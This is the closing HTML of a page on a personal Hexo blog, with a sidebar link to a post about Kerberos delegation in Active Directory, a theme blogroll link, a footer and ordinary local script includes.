        <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 ShadowMccc's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
